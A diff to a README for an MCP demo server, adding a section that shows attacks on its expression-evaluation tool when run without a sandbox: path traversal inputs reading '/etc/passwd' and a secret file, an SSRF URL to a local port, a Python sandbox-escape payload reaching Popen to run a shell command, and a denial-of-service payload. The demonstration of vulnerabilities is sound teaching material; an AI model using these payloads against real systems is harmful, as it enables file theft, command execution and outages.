@@ -194,8 +194,40 @@ claude mcp add --transport http mcp_demo http://localhost:8000/mcp
 ```
 
 ## Client
-For the client, consult the specific documentation. For example, [here](../mcp-client/README.md)
+For the client, consult the specific documentation. For example, [here](../mcp-client/README.md) or use the [MCP Inspector](https://modelcontextprotocol.io/docs/tools/inspector).
 
+Without sandbox, you can try 
+
+- a *Path Traversal*
+
+![Path traversal](path_traversal.png)
+
+`./.secret` or `file:///etc/passwd`
+
+- a *Server-Side Request Forger*
+
+![Server-Side Request Forger](SSRF.png)
+
+`http://localhost:636` for cups.
+
+- a *Remote Code Execution*
+
+![Remote Code Execution](RCE.png)
+
+```python
+[_ for _ in [c for c in add.__class__.__base__.__subclasses__()
+ if c.__name__ == "Popen"]
+][0]("cat README.md",shell=True,stdout=-1,text=True).communicate()[0]
+```
+
+- a *Deni of services*
+
+![Deny of Service](DOS.png)
+
+```python
+[_ for _ in [c for c in add.__class__.__base__.__subclasses__()
+ if c.__name__ == "count"]][0]()]
+```
 ## With claude-code
 To use the tool `evaluate_expression`:
 ```bash
